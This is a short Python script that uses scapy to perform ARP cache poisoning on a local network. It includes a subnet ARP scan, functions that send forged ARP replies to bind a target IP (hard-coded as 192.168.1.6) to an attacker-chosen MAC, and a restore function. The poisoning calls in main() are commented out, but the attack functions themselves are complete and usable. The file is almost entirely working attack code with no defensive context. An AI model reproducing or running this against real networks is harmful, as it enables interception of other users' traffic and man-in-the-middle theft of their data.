#ARP cache poisoning
from scapy.all import *
from sys import *
from NetSweep import *


# Function to send ARP requests and collect responses
def arp_scan(ip_range):
    # Create ARP request packet
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    
    # Send and receive ARP requests
    result = srp(arp_request, timeout=3, verbose=False)[0]
    
    # List to store IP-MAC mappings
    devices = []
    
    # Process responses
    for sent, received in result:
        # Extract IP and MAC addresses from responses
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return devices

def arp_poison(router_ip, target_ip, new_mac):
    i=0
    poison = ARP(pdst=router_ip, psrc=target_ip, hwsrc=new_mac)
    while( i < 500):
        sendp(poison, verbose=False, realtime = True, )
        i = i+1
    
    


# Function to print results
def print_results(devices):
    print("IP Address\t\tMAC Address")
    print("-----------------------------------------")
    for device in devices:
        print(f"{device['ip']}\t\t{device['mac']}")



def getmac(targetip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print ("ARP Table restored to normal for " + targetip)



def main():
    gateway = getGateway()
    #print("Default gateway:" + gateway + "/24")
    #devices = arp_scan(gateway + "/24")
    #print("Old scan")
    #print_results(devices)

    #my_phone = "192.168.1.6"
    #new_mac = "96:74:D9:8F:30:33"
    #arp_poison(gateway, my_phone, new_mac)
    #devices = arp_scan(gateway + "/24")
    #print("New scan")
    #print_results(devices)

    targetip= ("192.168.1.6")
    gatewayip= (gateway)
    

#Run main
if __name__ == "__main__":
    main()